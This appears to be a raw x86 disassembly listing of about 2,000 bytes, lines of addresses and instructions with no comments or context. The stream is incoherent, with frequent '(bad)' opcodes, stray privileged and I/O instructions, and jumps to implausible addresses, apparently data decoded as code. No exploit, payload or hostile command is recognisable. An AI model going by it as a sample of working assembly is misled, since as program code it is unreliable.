  4329d9:	into   
  4329da:	ffreep st(6)
  4329dc:	retf   0x6c7
  4329df:	iret   
  4329e0:	dec    ebp
  4329e1:	inc    ebp
  4329e2:	mov    DWORD PTR [ebx],edi
  4329e4:	fmul   QWORD PTR [edi]
  4329e6:	dec    ebp
  4329e7:	jnp    0x432a1c
  4329e9:	add    BYTE PTR [ebx],al
  4329eb:	mov    ecx,DWORD PTR [esp+edi*8]
  4329ee:	inc    ebp
  4329ef:	dec    ebp
  4329f0:	lea    esi,[ebx]
  4329f2:	add    DWORD PTR [ebx],eax
  4329f4:	jb     0x432a31
  4329f6:	add    BYTE PTR [edi],cl
  4329f8:	inc    ebp
  4329f9:	imul   eax,edi,0x858bd800
  4329ff:	cld    
  432a00:	clc    
  432a01:	mov    DWORD PTR [ebp+0x0],eax
  432a04:	inc    DWORD PTR [eax]
  432a06:	or     al,0xde
  432a08:	sbb    bh,0x1
  432a0b:	retf   
  432a0c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  432a13:	dec    ebp
  432a14:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  432a1a:	enter  0x12de,0xdf
  432a1e:	inc    ebp
  432a1f:	pop    ebp
  432a20:	dec    DWORD PTR [ebx-0x257f0ff4]
  432a26:	add    DWORD PTR [edx],edx
  432a28:	add    BYTE PTR [ebp+0x50],dl
  432a2b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  432a31:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  432a37:	or     ah,al
  432a39:	pop    ss
  432a3a:	cdq    
  432a3b:	push   ebp
  432a3c:	clc    
  432a3d:	mov    eax,DWORD PTR [ebp-0x4]
  432a40:	xor    edx,edx
  432a42:	add    esi,DWORD PTR [ebx]
  432a44:	cmp    eax,DWORD PTR [ebx]
  432a46:	hlt    
  432a47:	cmp    DWORD PTR [ebx],esp
  432a49:	or     al,BYTE PTR [ebp+0xf]
  432a4c:	mov    eax,DWORD PTR [edx]
  432a4e:	loopne 0x432a50
  432a50:	(bad)  
  432a51:	mov    ecx,esi
  432a53:	cld    
  432a54:	pushf  
  432a55:	pop    ebp
  432a56:	cdq    
  432a57:	mov    esi,DWORD PTR [edx]
  432a59:	lock mov eax,eax
  432a5c:	adc    BYTE PTR [ebx],al
  432a5e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  432a65:	xor    ebp,DWORD PTR [edi+0x50e45189]
  432a6b:	dec    ebp
  432a6c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  432a72:	(bad)  
  432a73:	iret   
  432a74:	inc    ebp
  432a75:	(bad)  
  432a76:	jne    0x432ac5
  432a78:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  432a7e:	(bad)  
  432a7f:	cmp    ebx,eax
  432a81:	je     0x432a09
  432a83:	add    edi,edi
  432a85:	or     bh,bh
  432a87:	dec    ebp
  432a88:	inc    ebp
  432a89:	mov    esi,DWORD PTR [ebx]
  432a8b:	cld    
  432a8c:	add    ecx,esi
  432a8e:	cmp    ecx,DWORD PTR [eax-0xc]
  432a91:	mov    edx,DWORD PTR [edi]
  432a93:	or     BYTE PTR [ebp-0x7c],al
  432a96:	mov    ebx,DWORD PTR [ecx-0x7639cd18]
  432a9c:	test   BYTE PTR [ecx+ebx*4],cl
  432a9f:	inc    ebp
  432aa0:	xor    bh,BYTE PTR ds:0x8be89c89
  432aa6:	out    dx,eax
  432aa7:	adc    BYTE PTR [eax],al
  432aa9:	jne    0x432a72
  432aab:	mov    ebp,esp
  432aad:	fcomp  DWORD PTR [ebx]
  432aaf:	add    BYTE PTR [ecx],al
  432ab1:	inc    DWORD PTR [ebp-0x75]
  432ab4:	mov    esp,?
  432ab6:	add    al,0xce
  432ab8:	mov    ecx,edi
  432aba:	cld    
  432abb:	inc    ebp
  432abc:	fidivr WORD PTR [ebx]
  432abe:	fbstp  TBYTE PTR [ebp-0x3e]
  432ac1:	mov    eax,DWORD PTR [eax]
  432ac3:	adc    BYTE PTR [ebx-0x3974038b],cl
  432ac9:	fadd   st,st(7)
  432acb:	add    BYTE PTR [ebp-0x1],al
  432ace:	mov    ecx,DWORD PTR [esp+edi*8]
  432ad1:	inc    ebp
  432ad2:	mov    bh,0xc7
  432ad5:	loopne 0x432b1c
  432ad7:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  432add:	add    DWORD PTR [ebx],esi
  432adf:	pushf  
  432ae0:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  432ae6:	mov    eax,edi
  432ae8:	cwde   
  432ae9:	inc    ebp
  432aea:	inc    ebp
  432aeb:	jne    0x432a78
  432aed:	mov    esp,esp
  432aef:	clc    
  432af0:	add    al,0x4d
  432af2:	mov    DWORD PTR [ebx],esi
  432af4:	or     al,0x33
  432af6:	inc    ebp
  432af7:	lea    ecx,[ebx-0x398d13fd]
  432afd:	add    bh,al
  432aff:	inc    ebp
  432b00:	ror    DWORD PTR [ebx+0x45d829],0x8b
  432b07:	add    ebp,esp
  432b09:	shufps xmm1,xmm3,0xc7
  432b0d:	(bad)  
  432b0e:	jmp    0x74886637
  432b13:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  432b19:	hlt    
  432b1a:	mov    ecx,DWORD PTR [edi]
  432b1c:	fadd   DWORD PTR [ebp+0x0]
  432b1f:	xor    ecx,DWORD PTR [edi]
  432b21:	add    ecx,ecx
  432b23:	cmp    edi,edi
  432b25:	pmuludq mm7,QWORD PTR [edx+0x50]
  432b29:	(bad)  
  432b2a:	jmp    0x432ab7
  432b2c:	mov    edi,esp
  432b2e:	or     al,0xc6
  432b30:	inc    ebp
  432b31:	(bad)  
  432b32:	mov    eax,DWORD PTR [ebp+0x10]
  432b35:	jne    0x432ac0
  432b37:	mov    eax,DWORD PTR [ecx]
  432b39:	clc    
  432b3a:	add    BYTE PTR [ebp-0x40],cl
  432b3d:	xor    edx,DWORD PTR [eax-0x73]
  432b40:	jne    0x432b43
  432b42:	push   DWORD PTR [edx+0x8]
  432b45:	add    BYTE PTR [ebp+0x45],al
  432b48:	mov    ebp,ecx
  432b4a:	cld    
  432b4b:	add    BYTE PTR [ebp+0x0],cl
  432b4e:	xor    eax,DWORD PTR [ebp+0x3]
  432b51:	mov    ?,WORD PTR [ebx]
  432b53:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  432b59:	sub    eax,0x5d330e4d
  432b5e:	lea    esi,[ebx]
  432b60:	add    DWORD PTR [ebx],eax
  432b62:	jb     0x432b4d
  432b64:	add    BYTE PTR [eax],al
  432b66:	inc    ebp
  432b67:	add    bl,ch
  432b69:	inc    ebp
  432b6a:	mov    esi,DWORD PTR [ebx]
  432b6c:	or     al,0x3
  432b6e:	(bad)  
  432b6f:	mov    edi,eax
  432b71:	in     al,dx
  432b72:	scas   eax,DWORD PTR es:[edi]
  432b73:	inc    ebp
  432b74:	mov    esi,DWORD PTR [ebx]
  432b76:	in     al,0x3
  432b78:	add    al,0x89
  432b7a:	mov    ecx,DWORD PTR [eax+edi*8]
  432b7d:	dec    ebp
  432b7e:	(bad)  
  432b7f:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3167]
  432b86:	mov    ecx,eax
  432b88:	cld    
  432b89:	push   es
  432b8a:	dec    ebp
  432b8b:	add    al,0x33
  432b8d:	mov    DWORD PTR [ebx],eax
  432b8f:	in     al,dx
  432b90:	cmp    DWORD PTR [ebp-0x67],eax
  432b93:	mov    eax,DWORD PTR [ebp-0xba0068]
  432b99:	mov    edx,DWORD PTR [ebp-0x4]
  432b9c:	mov    ecx,DWORD PTR [ebp-0x2c]
  432b9f:	xor    eax,DWORD PTR [ebp+0x3]
  432ba2:	cmp    DWORD PTR [ebx],0x8b327498
  432ba8:	xor    edi,esp
  432baa:	jmp    0xff7728fc
  432baf:	add    ecx,DWORD PTR [ebp-0x3f]
  432bb2:	xor    ebx,DWORD PTR [edi]
  432bb4:	add    eax,ecx
  432bb6:	cmp    ebx,DWORD PTR [eax]
  432bb8:	mov    ecx,DWORD PTR [ebp-0x4]
  432bbb:	mov    ecx,DWORD PTR [eax]
  432bbd:	adc    BYTE PTR [ebp-0x80],al
  432bc0:	jmp    0x432bc3
  432bc2:	mov    eax,DWORD PTR [eax]
  432bc4:	cld    
  432bc5:	mov    bh,0xc6
  432bc7:	push   ecx
  432bc8:	(bad)  
  432bc9:	jne    0x432c29
  432bcb:	dec    ecx
  432bcd:	or     BYTE PTR [ecx+ebx*1],cl
  432bd0:	push   ebp
  432bd1:	inc    ebp
  432bd2:	in     al,dx
  432bd3:	add    ebp,esp
  432bd5:	or     bh,al
  432bd7:	dec    ebp
  432bd8:	cld    
  432bd9:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  432bdf:	cmp    DWORD PTR [ecx],0x2
  432be2:	pushf  
  432be3:	dec    DWORD PTR [ebx+0x45510cf4]
  432be9:	mov    DWORD PTR [ebx+0x5145fc0c],ecx
  432bef:	mov    edx,DWORD PTR [ecx+0xc]
  432bf2:	xor    eax,esi
  432bf4:	mov    edx,0xc172c7
  432bf9:	inc    ebp
  432bfa:	mov    esi,DWORD PTR [ebp+0x8]
  432bfd:	mov    eax,edx
  432bff:	call   0x84c7f2f4
  432c04:	add    DWORD PTR [ecx-0x76bace00],ebx
  432c0a:	mov    ebp,eax
  432c0c:	or     BYTE PTR [eax],dl
  432c0e:	jo     0x432c5d
  432c10:	push   edi
  432c11:	xor    esi,DWORD PTR [ebp+0x3]
  432c14:	(bad)  
  432c15:	pmulhuw mm0,mm1
  432c18:	test   DWORD PTR [ebp-0x8],ecx
  432c1b:	mov    DWORD PTR [ebp-0x67],eax
  432c1e:	mov    eax,DWORD PTR [ebp-0x4]
  432c21:	xor    edi,DWORD PTR [ebp-0x73]
  432c24:	xor    eax,DWORD PTR [ebx]
  432c26:	xor    esi,DWORD PTR [edx+0x3]
  432c29:	add    BYTE PTR [ecx],bh
  432c2b:	inc    ebp
  432c2c:	(bad)  
  432c2d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  432c33:	mov    DWORD PTR [eax],0x750f0004
  432c39:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  432c3f:	lock add BYTE PTR [ebp+0x0],cl
  432c43:	mov    esi,DWORD PTR [ebp-0x18]
  432c46:	mov    ebp,edx
  432c48:	or     al,0x72
  432c4a:	ja     0x432c4c
  432c4c:	mov    edx,esi
  432c4e:	cld    
  432c4f:	(bad)  
  432c52:	cli    
  432c53:	mov    esi,DWORD PTR [ebp-0x4]
  432c56:	cmp    ecx,esi
  432c58:	bswap  edi
  432c5a:	(bad)
  432c5e:	mov    esi,DWORD PTR [ebp-0x4]
  432c61:	mov    esi,ecx
  432c63:	clc    
  432c64:	repnz add esi,DWORD PTR [ebp+0x45]
  432c68:	push   ebx
  432c69:	xor    eax,DWORD PTR [ebp+0x3]
  432c6c:	cmp    ebx,DWORD PTR [edi-0x64]
  432c6f:	pop    ebx
  432c70:	jmp    0x432d37
  432c75:	mov    esi,DWORD PTR [ebp-0x7d]
  432c78:	xor    ebp,DWORD PTR [eax]
  432c7a:	lea    eax,[ebp-0x8]
  432c7d:	ss repnz pushf 
  432c80:	out    dx,eax
  432c81:	(bad)  
  432c82:	neg    eax
  432c84:	ins    DWORD PTR es:[edi],dx
  432c85:	test   esi,edi
  432c87:	clc    
  432c88:	pop    esp
  432c89:	inc    ebp
  432c8a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  432c90:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  432c96:	add    cl,al
  432c98:	jne    0x432c33
  432c9a:	mov    esi,DWORD PTR [edx]
  432c9c:	in     al,dx
  432c9d:	push   esi
  432c9e:	xor    BYTE PTR [ebp-0xe],dh
  432ca1:	add    edi,esi
  432ca3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  432ca9:	add    cl,bh
  432cab:	mov    edi,DWORD PTR [ebp+0x8]
  432cae:	mov    DWORD PTR [ebp-0x14],esi
  432cb1:	add    esi,DWORD PTR [ebp+0x3c]
  432cb4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  432cba:	mov    ah,0x3d
  432cbc:	cdq    
  432cbd:	pushf  
  432cbe:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  432cc4:	jne    0x432c51
  432cc6:	mov    ecx,DWORD PTR [esp+ebp*8]
  432cc9:	icebp  
  432cca:	icebp  
  432ccb:	shl    edx,0xf2
  432cce:	(bad)  
  432ccf:	mov    ah,0x16
  432cd1:	inc    eax
  432cd2:	jne    0x432c67
  432cd4:	mov    ecx,DWORD PTR [edi]
  432cd6:	in     al,dx
  432cd7:	jmp    0x432cca
  432cd9:	add    dl,dh
  432cdb:	mov    edi,esi
  432cdd:	or     al,0x8
  432cdf:	inc    ebp
  432ce0:	jne    0x432ce5
  432ce2:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  432ce8:	ret    
  432ce9:	or     bh,bh
  432ceb:	jge    0x432cd5
  432ced:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  432cf3:	xor    edi,eax
  432cf5:	add    esi,DWORD PTR [ebp-0x77]
  432cf8:	mov    ebx,esp
  432cfa:	clc    
  432cfb:	neg    DWORD PTR [ebp-0x7c]
  432cfe:	xor    eax,DWORD PTR [eax]
  432d00:	cmp    eax,DWORD PTR [eax]
  432d02:	repz jne 0x432c9a
  432d05:	xor    eax,DWORD PTR [ecx]
  432d07:	add    ebx,DWORD PTR [eax]
  432d09:	mov    DWORD PTR [ebp-0x8],eax
  432d0c:	mov    eax,edi
  432d0e:	cld    
  432d0f:	lock pop eax
  432d11:	test   DWORD PTR [ebx],esi
  432d13:	clc    
  432d14:	add    edx,DWORD PTR [edi-0x740bff77]
  432d1a:	fdivp  st(4),st
  432d1c:	test   ecx,esi
  432d1e:	(bad)  
  432d1f:	jnp    0x432d20
  432d21:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  432d27:	jae    0x432cb4
  432d29:	sub    edi,esp
  432d2b:	(bad)  
  432d2c:	shl    DWORD PTR [eax-0x3e],0x89
  432d30:	leave  
  432d31:	call   0x8198e43e
  432d36:	in     al,dx
  432d37:	(bad)  
  432d38:	in     al,dx
  432d39:	add    bh,al
  432d3b:	mov    esp,edi
  432d3d:	in     al,dx
  432d3e:	test   DWORD PTR [ebp-0x8],edi
  432d41:	mov    eax,DWORD PTR [ebp+0x2b]
  432d44:	cmp    DWORD PTR [ebx],eax
  432d46:	pushf  
  432d47:	jnp    0x57322980
  432d4d:	xor    edx,DWORD PTR [ecx-0x77]
  432d50:	push   ecx
  432d51:	loopne 0x432d86
  432d53:	jne    0x432d10
  432d55:	mov    esi,DWORD PTR [edx-0x20]
  432d58:	add    BYTE PTR [ebp-0x3d],bh
  432d5b:	xor    eax,DWORD PTR [ebp-0x73]
  432d5e:	mov    edi,DWORD PTR [esi]
  432d60:	cld    
  432d61:	jb     0x432d29
  432d63:	add    bl,al
  432d65:	jne    0x432dac
  432d67:	mov    edx,DWORD PTR [edi-0x10]
  432d6a:	jge    0x432de9
  432d6c:	mov    esi,DWORD PTR [ebx]
  432d6e:	lock add ecx,DWORD PTR [ebp+0x3b]
  432d72:	xor    esi,DWORD PTR [ebp-0x77]
  432d75:	mov    esi,eax
  432d77:	lock inc ebp
  432d79:	jge    0x432db1
  432d7b:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  432d82:	dec    ebp
  432d83:	mov    esi,DWORD PTR [ebx]
  432d85:	loopne 0x432d10
  432d87:	jge    0x432d81
  432d89:	add    DWORD PTR [ebp-0x7d],eax
  432d8c:	test   BYTE PTR [edx],0x9c
  432d8f:	dec    ebp
  432d90:	mov    esi,DWORD PTR [ebp-0xc]
  432d93:	mov    ecx,DWORD PTR [ebp-0xc]
  432d96:	xor    ebx,DWORD PTR [ebp-0x77]
  432d99:	mov    esi,esp
  432d9b:	in     al,0x45
  432d9d:	jge    0x432dd9
  432d9f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432da6:	dec    ebp
  432da7:	inc    esp
  432da8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  432dae:	inc    ebp
  432daf:	hlt    
  432db0:	ss jne 0x432d52
  432db3:	mov    edi,DWORD PTR [eax+0xf19504]
  432db9:	repnz mov DWORD PTR [ebp+0x20],ebx
  432dbd:	cmp    eax,DWORD PTR [ebp+0xf]
  432dc0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432dc4:	fistp  WORD PTR [ebx+0x0]
  432dc7:	inc    ebp
  432dc8:	mov    ebx,DWORD PTR [edi+0xc]
  432dcb:	add    eax,eax
  432dcd:	inc    ebp
  432dce:	test   BYTE PTR [ebx],dh
  432dd0:	add    eax,DWORD PTR [ebx]
  432dd2:	add    BYTE PTR [esi+0x45],bl
  432dd5:	ret    0x85
  432dd8:	jnp    0x5443b1a7
  432dde:	inc    bp
  432de0:	inc    ebp
  432de1:	ss mov ecx,0xc78a9c
  432de7:	fdiv   QWORD PTR [ebx]
  432de9:	test   DWORD PTR [ecx+0x453af8],edi
  432def:	push   ebx
  432df0:	add    edi,DWORD PTR [esi+0x708088b]
  432df6:	cmp    esi,eax
  432df8:	setns  BYTE PTR [ecx-0x74fcffce]
  432dff:	mov    esp,edi
  432e01:	call   0x33ce7353
  432e06:	or     BYTE PTR [ebx],al
  432e08:	inc    ecx
  432e09:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  432e0f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432e15:	lock add cl,al
  432e18:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  432e1f:	mov    ch,0x45
  432e21:	clc    
  432e22:	xor    eax,DWORD PTR [ebp+0x3]
  432e25:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432e2b:	inc    ebp
  432e2c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432e32:	mov    edi,eax
  432e34:	mov    eax,DWORD PTR [ebp+0x3c]
  432e37:	mov    ecx,DWORD PTR [eax]
  432e39:	hlt    
  432e3a:	inc    ebp
  432e3b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432e42:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432e48:	push   ebp
  432e49:	mov    edi,DWORD PTR [ebx]
  432e4b:	in     al,dx
  432e4c:	jne    0x432e0f
  432e4e:	mov    eax,DWORD PTR [ebp-0x28]
  432e51:	add    DWORD PTR [eax],0xe8058dec
  432e57:	clc    
  432e58:	mov    esi,DWORD PTR [edi-0x8]
  432e5b:	add    dh,dl
  432e5d:	rol    WORD PTR [ebp-0x1],cl
  432e61:	mov    edx,DWORD PTR [eax+0x8]
  432e64:	jne    0x432e26
  432e66:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432e6d:	inc    ebp
  432e6e:	push   esp
  432e6f:	test   DWORD PTR [ecx+0xf],ecx
  432e72:	sub    edx,esp
  432e74:	add    eax,DWORD PTR [eax]
  432e76:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432e7c:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  432e83:	mov    eax,DWORD PTR [ecx]
  432e85:	and    BYTE PTR [eax],al
  432e87:	cmp    BYTE PTR [eax],dl
  432e89:	add    BYTE PTR [ebp+0x66],al
  432e8c:	inc    ecx
  432e8e:	push   esp
  432e8f:	(bad)  
  432e90:	jne    0x432e92
  432e92:	push   edx
  432e93:	enterw 0xc1,0x4d
  432e98:	mov    esp,DWORD PTR [esi+0x20]
  432e9b:	add    DWORD PTR [ecx-0x7b],eax
  432e9e:	add    eax,DWORD PTR [ebx]
  432ea0:	str    WORD PTR [eax+0x45]
  432ea4:	lea    ecx,[ebx+0x45890801]
  432eaa:	sbb    BYTE PTR [ebx],al
  432eac:	dec    ebp
  432ead:	cmp    al,0xf
  432eaf:	inc    ebp
  432eb0:	push   eax
  432eb1:	mov    esi,DWORD PTR [ebx]
  432eb3:	push   eax
  432eb4:	add    eax,eax
  432eb6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432ebd:	inc    ebp
  432ebe:	add    BYTE PTR [esi],dh
  432ec0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432ec7:	(bad)  
  432ec8:	mov    ebx,eax
  432eca:	loopne 0x432f11
  432ecc:	dec    ebp
  432ecd:	mov    ecx,DWORD PTR [edi]
  432ecf:	cld    
  432ed0:	push   eax
  432ed1:	xchg   DWORD PTR [ebx],esi
  432ed3:	add    DWORD PTR [ebx],ebp
  432ed5:	add    BYTE PTR [ebx],ch
  432ed7:	or     BYTE PTR [ecx],bh
  432ed9:	dec    ecx
  432eda:	loopne 0x432edf
  432edc:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432ee2:	push   ebp
  432ee3:	add    DWORD PTR [ebx+0x55100800],eax
  432ee9:	dec    ebp
  432eea:	jmp    0x432e75
  432eec:	mov    esp,DWORD PTR [eax]
  432eee:	sbb    dl,dl
  432ef0:	inc    eax
  432ef1:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432ef7:	add    BYTE PTR [ebx+0x74528555],cl
  432efd:	push   ebp
  432efe:	div    DWORD PTR [ebx]
  432f00:	and    eax,DWORD PTR [ebx]
  432f02:	add    edx,DWORD PTR [edx-0x30]
  432f05:	jno    0x432e92
  432f07:	inc    DWORD PTR [eax+eiz*1]
  432f0a:	inc    ebp
  432f0b:	push   eax
  432f0c:	push   eax
  432f0d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432f13:	mov    edi,esp
  432f15:	push   eax
  432f16:	inc    ebp
  432f17:	enter  0x458b,0x8
  432f1b:	push   ecx
  432f1c:	(bad)  
  432f1d:	call   0x10d38f5
  432f22:	pop    ss
  432f23:	push   ebp
  432f24:	mov    ecx,DWORD PTR [ebx+0x489408]
  432f2a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432f30:	push   ecx
  432f31:	jo     0x432f1b
  432f33:	inc    DWORD PTR [edi]
  432f35:	or     BYTE PTR [eax],al
  432f37:	call   0xce3681
  432f3c:	fmul   QWORD PTR [ebp+0x55]
  432f3f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432f45:	mov    bh,0x8c
  432f47:	adc    al,0x99
  432f49:	dec    esp
  432f4a:	xor    bl,BYTE PTR [eax]
  432f4c:	mov    ecx,DWORD PTR [ebp+0xc]
  432f4f:	mov    eax,DWORD PTR [ebp-0x4]
  432f52:	mov    esi,DWORD PTR [edi-0x3148f924]
  432f58:	push   es
  432f59:	retf   
  432f5a:	mov    BYTE PTR [ebp-0x30],0x3b
  432f5e:	inc    ebp
  432f5f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432f66:	retf   0x83fc
  432f69:	into   
  432f6a:	dec    ebp
  432f6b:	retf   
  432f6c:	mov    ecx,DWORD PTR [ebp-0x74]
  432f6f:	mov    eax,DWORD PTR [eax]
  432f71:	fdiv   QWORD PTR [ebx]
  432f73:	mov    bh,0x3
  432f75:	push   es
  432f76:	mov    esi,ecx
  432f78:	sbb    cl,dl
  432f7a:	dec    ebp
  432f7b:	sar    DWORD PTR [ebx],cl
  432f7d:	push   ebp
  432f7e:	jne    0x432f8f
  432f80:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432f86:	lea    ebx,[eax]
  432f88:	call   0xf4ccbb4f
  432f8d:	sbb    dh,dl
  432f8f:	add    edx,ebx
  432f91:	push   ebp
  432f92:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432f98:	push   ecx
  432f99:	mov    DWORD PTR [eax-0x30],edx
  432f9c:	test   DWORD PTR [edx],eax
  432f9e:	xadd   esp,esi
  432fa1:	pop    es
  432fa2:	add    cl,dl
  432fa4:	mov    eax,ecx
  432fa6:	or     al,0x45
  432fa8:	(bad)  
  432fa9:	push   eax
  432faa:	add    DWORD PTR [edx+0x0],eax
  432fad:	add    ecx,DWORD PTR [ecx]
  432faf:	and    dh,cl
  432fb1:	call   0xc73881
  432fb6:	add    DWORD PTR [ebp+0x0],edx
  432fb9:	mov    esp,DWORD PTR [ebp+0x18]
  432fbc:	add    BYTE PTR [eax+0x48],cl
  432fbf:	xor    eax,DWORD PTR [eax]
  432fc1:	add    esp,DWORD PTR [esi+0x3b]
  432fc4:	inc    ebp
  432fc5:	je     0x432f4a
  432fc7:	push   ecx
  432fc8:	push   es
  432fc9:	dec    ebp
  432fca:	mov    DWORD PTR [ebx],eax
  432fcc:	(bad)  
  432fcd:	or     al,0x5e
  432fcf:	inc    eax
  432fd0:	add    BYTE PTR [ebx],al
  432fd2:	data16 and BYTE PTR [ebp+0x50],al
  432fd6:	sub    DWORD PTR [ecx],0xfffffff8
  432fd9:	add    BYTE PTR [ebp-0x75],ah
  432fdc:	add    BYTE PTR [eax],bl
  432fde:	enter  0x894d,0x8b
  432fe2:	int3   
  432fe3:	loopne 0x43301f
  432fe5:	rol    BYTE PTR [eax],0x33
  432fe8:	lea    cx,[ebp+0xa]
  432fec:	data16 jb 0x433034
  432fef:	add    BYTE PTR [ebx+0x44890855],cl
  432ff5:	sbb    ah,al
  432ff7:	inc    ebp
  432ff8:	cmp    BYTE PTR [edi],cl
  432ffa:	add    BYTE PTR [edx+0x66],dl
  432ffd:	xor    ecx,DWORD PTR [eax]
  432fff:	sub    edi,esi
  433001:	mov    eax,DWORD PTR [eax]
  433003:	or     al,0x66
  433005:	ror    edx,cl
  433007:	dec    ebp
  433008:	inc    ebp
  433009:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43300f:	cld    
  433010:	or     BYTE PTR [edi+0x4501dd],dl
  433016:	ret    0xe8ce
  433019:	retf   
  43301a:	(bad)  
  43301b:	dec    ebp
  43301c:	mov    al,0x8b
  43301e:	in     al,dx
  43301f:	and    BYTE PTR [ebx],bh
  433021:	or     al,BYTE PTR [ebp+0x27]
  433024:	in     al,dx
  433025:	xchg   eax,ebp
  433027:	add    edi,eax
  433029:	add    BYTE PTR [eax+0x3f52ed55],bh
  43302f:	push   ebp
  433030:	inc    ebp
  433031:	xor    ebx,edx
  433033:	add    ebp,eax
  433035:	push   edx
  433036:	push   bp
  433038:	inc    ebp
  433039:	(bad)  
  43303a:	jmp    0xc342f693
  43303f:	sbb    al,0x33
  433041:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  433048:	add    BYTE PTR [ebp+0x44],0x8b
  43304c:	jmp    0xf98b:0x100041c8
  433053:	xor    esi,DWORD PTR [edx+0x3]
  433056:	mov    ecx,DWORD PTR [edi]
  433058:	fmul   DWORD PTR [edx]
  43305a:	add    BYTE PTR [eax],al
  43305c:	lea    eax,[ebx-0x4700273c]
  433062:	add    al,0x4f
  433064:	pop    DWORD PTR [eax]
  433066:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43306c:	push   edx
  43306d:	inc    WORD PTR [ebp+0x8]
  433071:	mov    eax,0x514f4d
  433076:	(bad)
  43307a:	add    al,al
  43307c:	xor    DWORD PTR [ebx-0x74baf730],eax
  433082:	test   DWORD PTR [esi+0x74],esp
  433085:	inc    ebp
  433086:	mov    DWORD PTR [eax+0xa4f08],edi
  43308c:	add    BYTE PTR [ecx-0x76c435bb],cl
  433092:	or     dh,cl
  433094:	or     eax,0x8b8d5045
  433099:	inc    ebp
  43309a:	mov    WORD PTR [ecx+0x3b8a00],?
  4330a0:	jne    0x4330d5
  4330a2:	mov    edi,DWORD PTR [edx+0x8f3a18]
  4330a8:	add    DWORD PTR [ebx],eax
  4330aa:	add    bh,bh
  4330ac:	adc    DWORD PTR [eax],ecx
  4330ae:	adc    DWORD PTR [ebp+0x55],edi
  4330b1:	push   es
  4330b2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4330b8:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c411da]
  4330bf:	inc    ebp
  4330c0:	mov    esp,edi
  4330c2:	or     al,0xda
  4330c4:	push   eax
  4330c5:	(bad)  
  4330c6:	jne    0x43307c
  4330c8:	call   0x3b29b7
  4330cd:	inc    ebp
  4330ce:	rol    ah,0x84
  4330d1:	call   0xbc43f7d6
  4330d6:	jne    0x4330b2
  4330d8:	mov    ebx,ebx
  4330da:	inc    edi
  4330dc:	and    al,al
  4330de:	fs jmp 0x7ec876e3
  4330e4:	bswap  ecx
  4330e6:	scas   al,BYTE PTR es:[edi]
  4330e7:	inc    esp
  4330e8:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  4330ef:	or     BYTE PTR [ebx-0x97717c6],0x83
  4330f6:	call   DWORD PTR [edi]
  4330f8:	shr    ah,0x84
  4330fb:	xchg   DWORD PTR [eax],eax
  4330fd:	add    DWORD PTR [eax],eax
  4330ff:	add    bh,bh
  433101:	dec    ebp
  433102:	and    BYTE PTR [ecx-0x38],dl
  433105:	push   eax
  433106:	dec    DWORD PTR [ebx+0xfd885]
  43310c:	mov    BYTE PTR [ebp+0x508bac00],cl
  433112:	mov    WORD PTR [ecx+0x0],ss
  433115:	lea    ecx,[ebx+0x108b20d8]
  43311b:	mov    WORD PTR [edx],ds
  43311d:	add    BYTE PTR [edi+0xff01ff],al
  433123:	mov    ecx,DWORD PTR [ebp-0x28]
  433126:	push   ecx
  433127:	shl    BYTE PTR [ebp+0x3a],0x8b
  43312b:	inc    ebp
  43312c:	in     al,0xeb
  43312e:	jno    0x4330bb
  433130:	push   edx
  433131:	mov    DWORD PTR [eax-0x28],edx
  433134:	mov    eax,DWORD PTR [ebp+0x20]
  433137:	je     0x4330c0
  433139:	mov    eax,DWORD PTR [ecx]
  43313b:	sbb    BYTE PTR [eax],al
  43313d:	pop    DWORD PTR [eax]
  43313f:	add    esi,eax
  433141:	add    bl,al
  433143:	adc    DWORD PTR [edi],esi
  433145:	jmp    0x8bce8197
